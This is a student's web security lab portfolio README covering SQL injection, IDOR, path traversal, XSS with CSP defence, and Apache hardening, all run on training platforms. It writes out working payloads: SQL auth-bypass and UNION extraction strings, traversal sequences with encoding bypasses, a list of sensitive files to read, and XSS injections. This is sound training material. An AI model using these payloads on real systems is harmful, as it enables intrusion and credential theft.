# 🌐 Web Security Labs

> Web application penetration testing · XSS & CSP defence · Apache hardening · SCI Mod 6
 

Hands-on web security labs covering both offensive exploitation and defensive hardening.
All offensive work conducted in isolated Docker environments (OWASP Juice Shop) and
authorised training platforms (PortSwigger Web Security Academy).

---

## 📁 Labs

| # | Lab | Tools | Status |
|---|---|---|---|
| 01 | [SQL Injection — Auth Bypass & UNION Extraction](#01--sql-injection--auth-bypass--union-extraction) | Burp Suite · OWASP Juice Shop · PortSwigger | ✅ Complete |
| 02 | [Broken Access Control — IDOR, Path Traversal & Forged Review](#02--broken-access-control--idor-path-traversal--forged-review) | Burp Suite · Intruder · PortSwigger | ✅ Complete |
| 03 | [XSS & Content Security Policy Defence](#03--xss--content-security-policy-defence) | Chrome DevTools · Burp Suite · OWASP Juice Shop | ✅ Complete |
| 04 | [Apache Web Server Hardening](#04--apache-web-server-hardening) | Apache · mod_headers · Nikto · curl | ✅ Complete |

---

### 01 · SQL Injection — Auth Bypass & UNION Extraction

**Tools:** Burp Suite Community Edition · OWASP Juice Shop (Docker) · PortSwigger Web Security Academy  
**Context:** Swiss Cyber Institute — Module 6 Web Application Security (Classes 22–24)  
**OWASP:** A03:2021 Injection  
**Real-world parallels:** TalkTalk (2015, 157k records) · Sony PSN (2011) · MOVEit (2023) · Equifax (2017)

Full SQL injection engagement from authentication bypass through chained exploitation to
credential exfiltration — combining Juice Shop hands-on challenges with PortSwigger methodology labs.

**Challenges completed:**

| Target | Type | Payload | Result |
|---|---|---|---|
| Juice Shop — Login Admin | Auth bypass | `' OR 1=1--` | Logged in as admin |
| Juice Shop — Login Bender | Targeted auth bypass | `bender@juice-sh.op'--` | Logged in as Bender |
| Juice Shop — Admin Section | Chained access | JWT from Login Admin | Accessed admin panel |
| Juice Shop — User Credentials | UNION extraction | `' UNION SELECT...` | 22 credentials exfiltrated |
| PortSwigger F1 | Hidden data | `' OR 1=1--` | Unreleased products visible |
| PortSwigger F2 | Column count | `' ORDER BY n--` / `UNION SELECT NULL...` | 3 columns confirmed |
| PortSwigger F3 | Data extraction | `' UNION SELECT username,password FROM users--` | Credentials extracted |

**The 4-step UNION methodology:**

```sql
-- Step 1: Confirm injection point
'                          -- syntax error = injectable

-- Step 2: Determine column count (increment until error)
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--             -- error at 4 = 3 columns

-- Alternative: NULL probing
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--   -- success = 3 columns

-- Step 3: Find string-compatible columns
' UNION SELECT 'a',NULL,NULL--
' UNION SELECT NULL,'a',NULL--    -- 'a' appears on page = column 2 accepts strings

-- Step 4: Extract target data
' UNION SELECT username,password,NULL FROM users--
```

**Real payloads used (Juice Shop login form):**

```
# Auth bypass — becomes first user (admin)
' OR 1=1--

# Targeted user — comments out password check for specific email
bender@juice-sh.op'--

# Result:
SELECT * FROM users WHERE email='' OR 1=1--' AND password='...'
# ↑ OR 1=1 always true · -- comments out password check
```

**Diagnostic gotchas from practice:**

- **304 cache trap** — cached response hides injection result; force fresh request (Ctrl+Shift+R or disable caching in DevTools)
- **URL encoding fights** — encode `'` as `%27`, spaces as `+` or `%20`, `--` as `--+` when needed
- **Column type mismatch** — use `NULL` first to confirm count, then substitute `'a'` to find string columns
- **Firefox vs Repeater** — browser auto-encodes some characters; use Burp Repeater for precise control

**MITRE ATT&CK:** T1190 (Exploit Public-Facing Application) · T1078 (Valid Accounts via stolen credentials)

**Defensive fix — parameterised queries:**

```python
# VULNERABLE — string concatenation
query = "SELECT * FROM users WHERE username='" + username + "'"

# SECURE — parameterised query (input cannot alter query structure)
query = "SELECT * FROM users WHERE username = ?"
cursor.execute(query, (username,))
```

---

### 02 · Broken Access Control — IDOR, Path Traversal & Forged Review

**Tools:** Burp Suite (Proxy · Repeater · Intruder) · OWASP Juice Shop · PortSwigger Web Security Academy  
**Context:** Swiss Cyber Institute — Module 6 Web Application Security (Classes 22–23)  
**OWASP:** A01:2021 Broken Access Control

Three broken access control variants — IDOR (insecure direct object reference), path traversal
with Burp Intruder recon, and a formal pentest report on a forged review vulnerability.

**Part A — IDOR (Insecure Direct Object Reference)**

The application exposes a basket ID in the request that maps directly to a database record
with no authorization check on whether the requesting user owns it.

```
# Step 1 — Log in as user, add item to basket, intercept in Burp
GET /rest/basket/1   ← your basket

# Step 2 — In Burp Repeater, change the ID
GET /rest/basket/2   ← another user's basket

# Result: 200 OK — full basket contents visible
# No session check, no ownership validation
```

- ✅ Juice Shop "View Basket" — IDOR via basket ID increment in Burp Repeater
- ✅ PortSwigger IDOR lab — horizontal privilege escalation via document ID manipulation

**Part B — Path Traversal + Burp Intruder Recon**

Single-file path traversal proved in PortSwigger labs, then escalated with a custom wordlist
attack to build a complete server profile from readable files.

```
# Step 1 — Basic traversal (PortSwigger)
GET /image?filename=../../../../etc/passwd

# Step 2 — Burp Intruder Sniper attack on the filename parameter
# Position: GET /image?filename=§§
# Wordlist: custom sensitive-files-linux.txt (40 targets)

# Results sorted by response length (non-200 = file not there):
/etc/passwd          → 200  ✅ user accounts
/etc/hostname        → 200  ✅ server name
/etc/hosts           → 200  ✅ network mapping
/proc/self/environ   → 200  ✅ environment variables — jackpot
/proc/self/cmdline   → 200  ✅ running process command line
/etc/apache2/apache2.conf → 200  ✅ server config
/etc/os-release      → 400  ❌
/var/log/apache2/access.log → 400  ❌ (nginx, not apache)
```

**Server profile reconstructed from 6 readable files:**

| Finding | Source file | Intelligence gained |
|---|---|---|
| User `peter` running under sudo | `/proc/self/environ` | Privilege context |
| Shell invocation path | `/proc/self/cmdline` | `/usr/bin/sh -c base64 <file>` |
| Apache 2.4 version | `/etc/apache2/apache2.conf` | CVE targeting |
| OS: Ubuntu 20.04 | `/etc/os-release` | Attack surface |

**PortSwigger path traversal labs completed:**

- Lab 1: Absolute path bypass (`/etc/passwd` directly, no `../`)
- Lab 2: Sequences stripped non-recursively (`....//....//etc/passwd`)
- Lab 3: Superfluous URL-decode (`..%252f..%252f` → `../../`)

**Part C — Forged Review (Formal Pentest Report)**

OWASP Juice Shop allows any authenticated user to submit a product review while supplying
a different `author` field — the server never validates it against the authenticated session.

```
# Step 1 — Post a legitimate review, intercept in Burp
POST /api/products/1/reviews
{"message":"Great product","author":"user@example.com"}

# Step 2 — In Repeater, change the author field
{"message":"Great product","author":"admin@juice-sh.op"}

# Response: 201 Created — forged review appears under admin's name
```

**Formal finding:**

| Field | Value |
|---|---|
| Vulnerability | Broken Access Control — Identity Spoofing via Client-Supplied Author |
| OWASP | A01:2021 Broken Access Control |
| CWE | CWE-284 Improper Access Control |
| CVSS v3.1 | 6.5 Medium (AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:N) |
| Impact | Any user can impersonate any other user in public-facing reviews |
| Fix | Derive `author` from the authenticated session server-side — never trust client input |

---

### 03 · XSS & Content Security Policy Defence

**Tools:** Chrome DevTools · Burp Suite · OWASP Juice Shop (Docker) · PortSwigger Web Security Academy  
**Context:** Swiss Cyber Institute — Module 6 Web Application Security (Classes 21–23)  
**OWASP:** A03:2021 Injection (XSS)

Complete XSS engagement: exploited four variants across Juice Shop, solved PortSwigger
reflected XSS, then switched to defender mode — analysed a real Content Security Policy
and verified nonce/hash-based blocking hands-on.

**XSS challenges completed:**

| Challenge | Type | Payload | Target |
|---|---|---|---|
| Juice Shop — DOM XSS | DOM-based | `<iframe src="javascript:alert('xss')">` | Angular search bar |
| Juice Shop — Bonus Payload | Reflected | SoundCloud iframe from scoreboard card | URL parameter reflection |
| PortSwigger — Reflected XSS | Reflected | `<script>alert(1)</script>` | HTML context, no encoding |

**DOM XSS — how the Angular payload works:**

```html
<!-- Angular sanitizes <script> but renders iframes in certain contexts -->
<!-- Injected into the search bar URL parameter: -->
<iframe src="javascript:alert('xss')">

<!-- Why it works: Angular's $sce.trustAsHtml bypassed by iframe src=javascript: -->
<!-- Result: alert dialog pops — XSS confirmed -->
```

**CSP — Content Security Policy Defence (Class 21 homework)**

Analysed a real CSP policy hands-on, identifying what it blocks and why.

**Policy analysed:**
```
default-src 'none';
style-src https://cdn.jsdelivr.net;
script-src 'nonce-U2xe3uVNOg5...' 'sha256-tVMkjDtxdSzxup4...';
connect-src https://cdn.jsdelivr.net;
```

**Task 1 — Two violations identified (verified in browser console):**

| Violation | Why blocked |
|---|---|
| Google Fonts `<link>` | Host not in `style-src` + uses `http://` not `https://` |
| Inline `<style>body{background:blue}</style>` | No `'unsafe-inline'`, no nonce, no hash in `style-src` |

**Task 2 — Why Bootstrap loads:**
Bootstrap CSS loads from `https://cdn.jsdelivr.net` — exact origin match to `style-src` value. ✅

**Task 3 — Nonce-based script execution:**
```html
<!-- Server adds nonce to CSP header and to the script tag -->
<script nonce="U2xe3uVNOg5...">/* legitimate code */</script>
<!-- Browser runs it only if nonce in tag matches nonce in header -->
<!-- Verified via Ctrl+U source view — not inferred -->
```

**Task 4 — Hash-based script execution:**
```
# Un-nonced script runs because its content matches the sha256 hash in script-src
# If script content changes by even one character → blocked
# Hash computed: sha256sum of exact script content
```

**CSP directive reference:**

| Directive | Controls | Bad value to avoid |
|---|---|---|
| `script-src` | Which JS may execute | `'unsafe-inline'` (defeats XSS protection) |
| `style-src` | Which CSS applies | `'unsafe-inline'` |
| `default-src` | Fallback for all | `*` (allows everything) |
| `connect-src` | fetch/XHR/WebSocket | — |

**How CSP stops XSS:**
Attacker injects `<script>alert(1)</script>`. Without CSP this executes. With `script-src 'nonce-{random}'`, the browser blocks it — the injected script has no nonce. The nonce is generated server-side per request and is unpredictable.

> **Key rule:** If a nonce or hash is present, `'unsafe-inline'` is ignored by browsers even if present in the policy.

**MITRE ATT&CK:** T1059.007 (JavaScript execution) · T1185 (Man-in-the-Browser)

---

### 04 · Apache Web Server Hardening

**Tools:** Apache httpd · mod_headers · mod_rewrite · Nikto · curl  
**Context:** Swiss Cyber Institute — Module 6 Class 25 (Harden a Web Server)  
**Platform:** Kali Linux — local Apache instance

Four live hardening exercises completed in class, each verified before/after with `curl -I`
and Nikto. Then a timed exam simulation (Apache hardening challenge — solved correctly).

**Exercise 1 — Virtual Host Setup**

```apache
# /etc/apache2/sites-available/cyber.conf
<VirtualHost *:80>
    ServerName cyber.local
    DocumentRoot /var/www/cyber
    ErrorLog ${APACHE_LOG_DIR}/cyber_error.log
    CustomLog ${APACHE_LOG_DIR}/cyber_access.log combined
</VirtualHost>
```

```bash
sudo a2ensite cyber.conf
sudo systemctl reload apache2
curl -H "Host: cyber.local" http://localhost/   # verify
```

**Exercise 2 — CSP Header (XSS before/after)**

```apache
sudo a2enmod headers

# Add to VirtualHost or server config:
<IfModule mod_headers.c>
    Header always set Content-Security-Policy "default-src 'self'"
</IfModule>
```

```bash
# Verify header is present:
curl -I http://localhost/ | grep Content-Security-Policy

# XSS before CSP: <script>alert(1)</script> executes in browser
# XSS after CSP:  browser blocks — no nonce, 'self' doesn't allow inline scripts
```

**Exercise 3 — Banner Grabbing Removal**

Without hardening, `curl -I` or Nikto reveals `Apache/2.4.59 (Debian)` — tells an attacker which CVEs apply.

```apache
# Add at SERVER level (not inside VirtualHost — causes "not allowed here" error):
ServerTokens Prod        # show only "Apache", hide version + OS
ServerSignature Off      # remove Apache info from error pages

<IfModule mod_headers.c>
    Header unset Server
    Header always unset X-Powered-By
</IfModule>
```

```bash
# Before:
curl -I http://localhost/
# Server: Apache/2.4.59 (Debian)

# After:
curl -I http://localhost/
# Server: Apache

# Nikto before: "+ Server: Apache/2.4.59 (Debian)"
# Nikto after:  "+ Server: Apache" — version no longer leaked
```

**Exercise 4 — IP Blocking with RequireAll**

```apache
<Directory /var/www/cyber>
    <RequireAll>
        Require all granted
        Require not ip 192.168.1.100     # block specific IP
        Require not ip 10.0.0.0/8        # block entire subnet
    </RequireAll>
</Directory>
```

```bash
# Without RequireAll, bare Require lines are OR'd — "allow all" OR "deny X" = always allowed
# RequireAll makes them AND'd — must satisfy ALL conditions

# Verify:
# Client-side: 403 Forbidden
# Server-side: AH01630 in /var/log/apache2/error.log
```

**Full hardening requirements reference (exam pattern):**

| Requirement | Directive | Common trap |
|---|---|---|
| Server header = "Apache" only | `ServerTokens Prod` | `ServerTokens Min` still leaks version |
| No footer on error pages | `ServerSignature Off` | `On` (default) |
| ETag without inode | `FileETag MTime Size` | `FileETag All` includes inode |
| Disable directory listing | `Options -Indexes` | `Options Indexes` enables it |
| HSTS with subdomains | `Strict-Transport-Security "max-age=31536000; includeSubDomains"` | Missing `includeSubDomains` |
| CSP no scripts | `Content-Security-Policy "default-src 'self'; script-src 'none'"` | Missing `script-src 'none'` |
| Prevent framing | `X-Frame-Options "DENY"` | `"SAMEORIGIN"` still allows same-origin |
| No MIME sniffing | `X-Content-Type-Options "nosniff"` | Missing entirely |
| Block specific IP, allow rest | `<RequireAll>` with `Require not ip X` | Bare `Require` lines are OR'd, not AND'd |
| Block HTTP 1.0 | `RewriteRule` with `HTTP/1\.0` condition | Missing `mod_rewrite` enable |

**Verification workflow:**

```bash
# 1. Edit config
sudo nano /etc/apache2/sites-available/cyber.conf

# 2. Syntax check BEFORE applying (non-parsing file = 0 marks on exam)
sudo apachectl configtest
# Expected: Syntax OK

# 3. Reload
sudo systemctl reload apache2

# 4. Semantic verification
curl -I http://localhost/              # check response headers
sudo nikto -h http://localhost/        # automated hardening check
tail -f /var/log/apache2/error.log     # check for errors
```

> **Exam rule:** Every change must be commented with `# Rn` (e.g., `# R1`, `# R3`). Uncommented changes are not graded. A file with syntax errors scores zero.

---

## 🧰 Tools Used

| Category | Tools |
|---|---|
| Web App Testing | Burp Suite Community Edition · FoxyProxy · ModHeader |
| Practice Platforms | OWASP Juice Shop (Docker) · PortSwigger Web Security Academy |
| Web Server | Apache httpd · mod_headers · mod_rewrite · mod_authz_core |
| Scanning | Nikto · curl |
| Analysis | Chrome DevTools · Browser console |
| Platform | Kali Linux · Docker · VirtualBox |

---

## 🌐 Platform Profiles

[![PortSwigger](https://img.shields.io/badge/PortSwigger-Web%20Security%20Academy-orange?style=for-the-badge)](https://github.com/jaalso/web-security)
[![JuiceShop](https://img.shields.io/badge/OWASP-Juice%20Shop-brightgreen?style=for-the-badge)](https://github.com/jaalso/web-security)

---

## ⚖️ Legal & Ethical Notice

All offensive security activities documented in this repo were conducted in:
- OWASP Juice Shop — self-hosted in Docker on personal Kali VM (no external connectivity)
- PortSwigger Web Security Academy — authorised training platform (browser-based isolated labs)

No real or production systems were tested. All work complies with Swiss law and ethical hacking standards.
Completed as part of the Swiss Cyber Institute CSS EFA Program — Module 6 Web Application Security.
